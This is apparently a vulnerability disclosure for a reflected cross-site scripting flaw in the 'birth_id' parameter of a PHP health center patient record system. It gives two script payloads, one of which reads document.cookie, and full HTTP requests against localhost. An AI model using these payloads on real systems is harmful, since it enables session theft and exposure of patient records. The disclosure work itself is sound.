# Health Center Patient Record Management System v1.0 has Cross-site scripting (reflected)

Website source address:https://www.sourcecodester.com/php/11058/health-center-patient-record-management-system.html

BUG_Author: wangte

Vulnerability File: /HCPMS/birthing_print.php

Parameter "birth_id" (GET), exists XSS vulnerability

Payload1:birth_id=1"><script>alert(1111)</script>

```
GET /HCPMS/birthing_print.php?birth_id=1%22%3E%3Cscript%3Ealert(1111)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close
```

![image](https://github.com/2689469248/bug_report/blob/main/pictures/xss1.png)

Payload2:birth_id=1"><script>alert(document.cookie)</script>

```
GET /HCPMS/birthing_print.php?birth_id=1%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=6fcav63hl60icb4n7tsvv0ns5k
Connection: close
```

![image](https://github.com/2689469248/bug_report/blob/main/pictures/xss2.png)
